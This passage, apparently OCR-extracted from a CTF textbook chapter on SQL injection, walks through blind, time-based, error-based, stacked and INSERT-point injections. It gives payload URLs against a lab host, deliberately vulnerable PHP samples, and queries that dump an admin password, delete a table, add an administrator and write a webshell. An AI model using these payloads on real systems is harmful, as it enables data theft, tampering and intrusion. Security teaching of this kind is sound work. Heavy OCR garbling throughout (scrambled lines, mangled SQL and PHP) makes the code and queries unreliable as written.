## Page 35
1.2 SQL Injection in CTF
19
+
have fun
have fun baby!
Fig, 1.31. Result
0 不8全 I 191
admin~this_is_the_admin_password
Fig, 1.32 Result
rest of the statement with "-%20" or "%23". Note that the input must be URL
Try using single quotes to close the previous single quotes, and then comment the
#, 1oy 7%, pue saoeds aog 07%, m papooua
Visit http://192.168.20.133/sq12.php?id2%27%23, and the results are shown in
Fig. 1.31.
The contents are successfully displayed, and the MySQL statement is now as
follows.
SELECT tit1e, content FRON wp_news HHERE id = 2′#1
The single quotation mark entered closes the previous single quotation mark, and
the °#’' entered comments the original query’s single quotation mark. The query is
executed successfully, and the next steps are consistent with the numeric injection in
Sect. 1.2.1.1,and the results are shown in Fig. 1.32.
Of course, in addition to comments, you can also use single quotation marks to
close the original query's quotation mark, see Fig. 1.33.
Visit http://192.168.20.133/sql2.php?id1’ and *1, and the database query state-
ment is shown in Fig. 1.34.
The statements after the keyword “WHERE" represent the condition of the
SELECT operation. Take the previous case as an example, “id=1” is the query
condition. Here, the keyword *AND" stands for two conditions that should be met,
(1)id1 :(2)*1′==true. The second condition will always be met since the string *1”
is converted to 1(which equals true). The database only needs to query for the row
with id=1.
---
## Page 36
20
1 Introduction to the Web
C①不变全192.168.20.133/sql2.php7id1%27%20
%20%271
sqli
it isthebeginning
Fig, 1.33 Use single quof
onbs.gnbmu2uogusoyosmwuom
oh man
hysql> select tttle,content fron wp_new
ttle|content
1 row tn set (o.oo sec)
Fig, 1.34 Result
nysql> select title,content fron wp_news where td='1' and
Enpty set, 1 warntng (e.e8 sec)
Fig, 1.35 Result
Look again at the statement shown in Fig. 1.35: the first condition is still id1,
and the second condition string *a’ is forced to be converted to a logical false, so the
condition is not satisfied and the query result is empty. When the page is displayed as
usual, it could prove that condition after AND is true, and when the page is displayed
as empty, the condition after AND is false, Although we do not see the data directly,
we can infer the data by injection, a technique known as Boolean-blind-type SQL
injection.
Here are the technical details about blind-bool-type SQL injection. For example, 
if the sensitive data has only one byte, first try to see if the data is *a’. If it is, then the
page wil display as id1*(first condition). Otherwise, the page will be blank. If the
p ,1=pdqdbs/109161/dq o o *J, s! pass q em
sensitive_data=°a', guess *a', and fail to guess, try “b', *e”, d’, “e', and fail to
guess, until you try f', you win, and the page displays as *id=1'. See the result in
Fig. 1.36.
Of course, this guessing process above is too slow. We can change the symbol
and use *~" to guess characters by range. Go to the link http://192.168.20.133/sql2.
php?id=1' and sensitive_data  select concat(user,ox7e,pwd) fron wp_user
concat(user,ox7e,pwd)
row tn set (o.oo sec)
is being guessed is less than the ASCII code of character *n', and then use the
dichotomy search algorithm to continue guessing the sensitive character.
The above case is only in a single-character condition, but in reality, most of the
data in the database is not a single character, so how do we get every byte of data in
this case? The answer is to use MySQL's own functions for data interception, such as
substringO, midO), and substrO, see Fig. 1.37.
sp q q sq   aio o ad a
above, so let us use it to get the password for admin. Query in MySQL (see Fig. 1.38
for results).
SELECT concat {user , Ox7e, pwd) FROM wp_user
Then intercept the first byte of the data (see Fig. 1.39 for results).
SELECT MID ( (SSL&CT concat (usex, 0x7e, pvd) FROM vp_user) , 1, 1)
So the complete exploit SQL query is as follows.
---
## Page 38
22
1 Introduction to the Web
nysql> select ntd((select concat(user,θx7e,pwd) fron wp_user),1,1)
ntd((select concat（user,ox7e,pd) fron wp_user),1,1)
a
Fow
w tn set (o.06 sec)
Fig, 1.39 Result
sqll
 is the bagining
Fig, 1.40 Result
nysql> select tltle,content fron wp_news where id='1' or sleep(1);
1uuu6ag ays111111bs
1row tn set (1.eo sec)
Fig. 1.41 Result
SELECT tit1e, content FRON wp_news HHERE id = +1' AND
[SELECT MID ( (SELECT concat (user, Ox7e, pvd) FROHvp_user) , 1, 1)) = *a*
Go to visit http:/192.168.20.133/sq12.php?id1’ and(select mid(select concat
(user,0x7e,pwd) from wp_user),1,1) = *a’%23 and the result is shown in Fig. 1.40.
To intercept the second byte, accessing htp://192.168.20.133/sq12.php?id=1’ and
(select mid(select concat(user,0x7e,pwd) from wp_user),2,1)’d’%23, the result is
consistent with Fig. 1.40, which shows that the second position character is 'd'. And
base on this method, we could get the other bytes.
Blind-type SQL injection, it is common to get sensitive data through the different
contents of the page responses. In some cases, the page responses are static, so it is
necessary to determine the result of SQL injection in other ways, such as the time
delay, which can be seen in Fig. 1.41. By modifying the parameters of the function
sleepO, we can make the delay longer to ensure that the delay is caused by the
injection and not by nomal query processing. Unlike theinstant results of the Blind
teristics of the IF statement or the AND/OR keywords and the time of SQL query
type SQL injection, the sleepO function takes advantage of the short-circuit charac-
execution to determine the result of the SQL injection attack, which is known as a
type, so no more specific examples to be needed here.
---
## Page 39
1.2 SQL Injection in CTF
23
1.2.1.3  Error-Type SQL Injection
Sometimes, in order to facilitate debugging by developers, some websites will
enable error debugging messages, the demo codesnap is shown in sql3.php.
sg13-pbp
?php
Sconn = mysgli_connect ("127.0.0.1", *root", *root*, "test") ;
Sres = mysqli_query (Sconn, *SELECT title, content FRoN vp_nevs
NHERE id = **,$_GET[′id′] "**) oR VAR_DUMP (mysgli_error [Sconn) ) ;
/ /Display the ezror
Srou = mysqli_fetch_array (Sres) ;
*[]x'<> oqo
echo "";
echo "" Srov[*content°] . *;
echo "";
echo "";
? >
-and TOs asneooq uooofu os xdi-roug ue poeo s! adi Supoee s
sents the error message after execution, as shown in Fig. 1.42.
As you can see from the documentation, the second parameter of the updatexml()
function should be a legal XPATH path when it is executed. Otherwise, it will output
the incoming parameter while raising an error, as shown in Fig. 1.43.
Using this feature, for an example of errors display, pass the sensitive information
we want to the second parameter of the updatexml function. Try to access the
link http://192.168.20.133/sql3.php?id1’ or updatexml(1, 
,concat(Ox7e,(select
pwd from wp_user),1)%23, the result is shown in Fig. 1.44.
In addition, when the target server enables multiple statement execution, arbitrary
database data can be mxdified using multiple statement execution. This type of
injection environment is called stacked SQL injection.
The source code snap is shown in sql4.php.
|+
1 :
Fig, 1.42 Result
nysgl> select tttle,content fron wp_news where Ida'1′ or updatexnl(1,concat(@x7e
p_user)),1)
IROR 1105 (HYooo): XPATH syntax error: *-thts_ls_the_adntn_pass
Fig, 143 Result
---
## Page 40
1 Introduction to the Web
C① 不更全  192.188.20.133//3.phe
ring(49) “XPATH synt
Fig, 1.44 Result
不R全192.188.20.133/4,pp51127
npty set (e.ne sec)
Fig, 1.45 Result
sq14 -php
?php
Sdb = new PDo (*mysq1 :host=1ocalhost : 3306 ; dbnar
=test", 'root'
root') ;
['id·] ."*" ;
$sq1 = SELECT tit1e, content FRON wp_news HHERE id='* , S_GET
} 人x1
foreach ($db- >query (Ssgl) as Srow) {
print_r (Srow) ;
catch (PDOException Se) (
echo Se->getMessage () ;
die () ;
≤ 
In this situation, you can execute any SQL statement after closing the single
quotes, such as trying to access http:/192.168.20.133/sq14.php?id1 %27;delete%
20%20from%20wp_files;%23 in a browser. The result could be seen in Fig. 1.45.
This action has deleted all data of table wp_files.
ean blind injection, Time blind injection, and Eror-type injection as the basis for
advanced SQL injections. These injection techniques are prioritized for ease of data
Sconn = mysgli_connect ("127. 0.0.1", *root", *root*, "test") ;
Sres = mysqli_query (Sconn, *s&LECT S[_G&T [id°1 ) , content FR.OM
Srov = mysqli_fetch_array (Sres) ;
echo "";
*[]x<> o
echo "" Srov[*content°] .*;
echo "";
echo "";
---
## Page 42
26
Introduction to the Web
this_is_the_admin_password
it is the beginning
Fig, 1.46 Result
In this situation, you can take the time-blind-type injection method from Sect.
1.2.1.2 to fetch the sensitive data, but according to MySQL syntax, we have a better
way to display the query results directly into the interface by using the AS alias
keyword. Access the link htp://192.168.20.133/sqln1.php?id(select%20pwd%
20from%20wp_user)%20as%20title, see Fig. 1.46.
2. injection point at table_reference
Replace the SQL query statement above with the following.
Sres = mysqli_query (Sconn, "SELECT title FROM S{_GET[′table′]}*) ;
We can still retrieve the data directly using aliases, such as
SELECT title FRoM (S&L&CT pwd AS title FROM wp_user)x;
Of course, if you do not know the exact table name, you can fetch table names
from the information_schema.tables table first.
For select_expr and table_reference injection points, the quotes need to be closed
first if the user input is wrapped in quotes. Readers could test the specific statements
locally.
3. The injection point is after WHERE or HAVING.
The SQL query statement is as follows.
Sres = mysqli_query (Sconn, "SELECT title FROM wp_news MHERE id = $/_GET
[1d]}") ;
This situation has already been discussed in Sect. 1.2.1, Injection Basics, and is
the most common situation encountered in real-world applications.
The situation is similar for the injection point after HA VING.
4. The injection point is after the GROUP BY or ORDER BY.
When you encounter an injection point that is not after WHERE, try it in your local
MySQL environment to see what you can add after the statement to determine where
---
## Page 43
1.2 SQL Injection in CTF
27
Fig, 1.47 Result
d dd>,  aii S3 dyd/dua, aano o 1 salas ';
Query oK, 1 row affected (0.08 sec)
xlaojunjtegubuntu:/tnps cat 1234.phpm
1xtaojun]te@ubuntu:/tnp$
Fig, 1.48 Result
the injection point is, and then do the injection accordingly. Assume the following
code.
Sres = mysqli_query (Sconn, "SELECT title FROM wp_news GROUP BY S(_G&T
['title']}") ;
After testing, it was found that titleid desc,(if(1,sleep(1),1) makes the response
1-second delay, so you can use the time injection method to get the sensitive data.
This section’s cases still widely exist even after most developers have become
security-conscious, mainly because developers cannot use pre-compiled methods to
handle such parameters when writing system frameworks. It is possible to defend
against such injections by simply whitelisting the input values.
5. The injection point is after LIMIT.
By changing the limit number, the page will show more or fewer records. Due to the
syntax limitation, the previous character injection method is not suitable (only
numbers can be injected after LIMIT). Altematively, we can try injecting by using
the PROCEDURE keyword based on the SELECT syntax, which is only available
for versions of MySQL before 5.6, see Fig. 1.47.
It is also possible to inject based on time, as follows.
PROCEDURE analyse (SELECT extractvalue [1, concat (0x3a, (IF (MID
(VERSION () , 1, 1) LIKE 5,
BENCHMARK (5000000, SHA1 (1) ) , 1))))) , 1)
The processing time for the BENCHMARK statement is about 1 second. We can
also use the INTO OUTFILE keyword to write a webshell in the web directory under
certain circumstances where we have the write permission. The query is SELECT xx
s * A8 CN SNT1 d-xxxd, o ON
Fig. 1.48.
---
## Page 44
28
1 Introduction to the Web
1.2.2.2 INSERT Statement Injection
The INSERT statement is one type that inserts records into a table and usually is used
in web design where news is added, users sign up, and comments to articles, etc. The
syntax of the INSERT statement is as follows.
INSERT [LOM_PRIORITY | D&LAYED | HIGH_PRIORITY][IGNOR&]
[PARTITIoN (partition_name [, partition_name] ---1]
[INTO] tbl_nane
{VALres | VALre] {value_1ist) (, (value_1iat1 ] -..
[ (col_name [, col_name] -- -1]
[ON DUPLICATE KEY UPDATE assignment_1ist]
INSERT [LOM_PRIORITY | DELAYED | HIGH_PRIORITY][IGNORE]
[INro] tbl_nane
[PARTITIoN (partition_name [, partition_name] ---1]
[ON DUPLICATE KEY UPDATE asaignment_1ist] =
SET assignment_1ist
INSERT [LOH_PRIORITY |HIGH_PRIORITY] [IGNORE]
[PARTITIoN (partition_name [, partition_name] -- -1]
[INTO] tbl_nane
[ (col_name [, col_name] ---1]
[ON DUPLICATE KEY UPDATE assignment_1ist]
SELECT
Usually, the injection point is located in the field name or field value, and there is
no response message after the execution of the INSERT statement.
1. The injection point is located at tbl_name
o no aoreup uogeoue ue qm suaais uanbasqns to uauoo uo no J
insert specific data directly into the desired table, such as the administrator table, for
example, for the following SQL statement.
Sres = mysqli_query (Sconn, "INSERT INTO [$_G&T [*tab1e ′]] VALUES
(2,2, 2, 2) ") ;
sou s  suda se ea sg o pooo on siod dop a
into the news table. Since we can control the table name, we can access http://
192.168.20.132/insert.php?table=wp_user  values(2,*newadmin’,'newpass')%23
and see Fig. 1.49 for the wp_user table before and after accessing the contents. A
new administrator record was inserted in the table.
2. The injection point is located in VALUES.
Assume the following SQL statement.
INSERT INTO wp_user VALUES (1, 1, *controllable location*) ;
---
## Page 45
1.2 SQL Injection in CTF
29
Fig, 149 Result
mysql> select * fron wp_user
>；
td
1usernane 1 password
11adntn
1password
row in set (o.oo sec)
td
1usernane|password
adntn
newadnin
password
newpass
2rows tn set (o.o6 sec)
You can close the single quote and then insert another record. Usually, the
administrator and the regular user are in the same table. The injection statement is